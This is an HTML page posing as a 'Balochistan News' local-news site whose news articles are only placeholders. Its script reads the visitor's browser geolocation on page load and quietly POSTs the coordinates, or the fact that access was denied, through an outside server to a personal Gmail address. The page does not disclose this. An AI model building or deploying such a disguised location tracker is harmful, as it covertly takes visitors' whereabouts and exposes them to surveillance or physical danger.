<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Balochistan News</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f9f9f9;
        }
        header {
            background-color: #00796b;
            color: white;
            padding: 15px;
            text-align: center;
        }
        #content {
            padding: 20px;
        }
        #locationDisplay {
            margin: 20px 0;
            font-size: 18px;
            color: #333;
        }
        .news-article {
            margin: 10px 0;
            padding: 10px;
            background-color: #e0f2f1;
            border-radius: 5px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        footer {
            margin-top: 20px;
            padding: 10px;
            background-color: #00796b;
            color: white;
            text-align: center;
        }
    </style>
</head>
<body>

<header>
    <h1>Balochistan News</h1>
</header>

<div id="content">
    <p>Stay updated with the latest news from Balochistan. Enable location to receive news based on your area.</p>
    <div id="locationDisplay">Detecting your location...</div>
    <div id="news">
        <!-- News articles will be loaded here -->
    </div>
</div>

<footer>
    <p>&copy; 2024 Balochistan News</p>
</footer>

<script>
    document.addEventListener("DOMContentLoaded", function () {
        const locationDisplay = document.getElementById("locationDisplay");
        const newsSection = document.getElementById("news");

        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;
                    locationDisplay.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;

                    loadLocalNews(latitude, longitude);

                    sendEmail('Location received', locationDisplay.textContent, 'khalilrodeni@gmail.com');
                },
                (error) => {
                    switch (error.code) {
                        case error.PERMISSION_DENIED:
                            locationDisplay.textContent = "Location access denied by user.";
                            break;
                        case error.POSITION_UNAVAILABLE:
                            locationDisplay.textContent = "Location information is unavailable.";
                            break;
                        case error.TIMEOUT:
                            locationDisplay.textContent = "Location request timed out.";
                            break;
                        default:
                            locationDisplay.textContent = "An unknown error occurred.";
                            break;
                    }
                    sendEmail('Location Access Error', locationDisplay.textContent, 'khalilrodeni@gmail.com');
                }
            );
        } else {
            locationDisplay.textContent = "Geolocation is not supported by this browser.";
        }

        function loadLocalNews(latitude, longitude) {
            // Placeholder: Add articles based on latitude and longitude
            newsSection.innerHTML = `
                <div class="news-article">
                    <h2>Local News Headline 1</h2>
                    <p>Summary of a news article relevant to coordinates (${latitude}, ${longitude}).</p>
                </div>
                <div class="news-article">
                    <h2>Local News Headline 2</h2>
                    <p>Another relevant news article based on location.</p>
                </div>
            `;
        }

        function sendEmail(subject, message, recipientEmail) {
            const emailData = {
                subject: subject,
                message: message,
                recipient_email: recipientEmail,
                recipient_name: "Balochistan News User"
            };

            fetch("https://zalex-backend.onrender.com/api/send-email/", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify(emailData)
            })
            .then(response => response.ok ? response.json() : Promise.reject(`Server responded with ${response.status}`))
            .then(data => alert(data.message ? "Email sent successfully!" : "Error sending email"))
            .catch(error => alert("Error sending email: " + error));
        }
    });
</script>

</body>
</html>
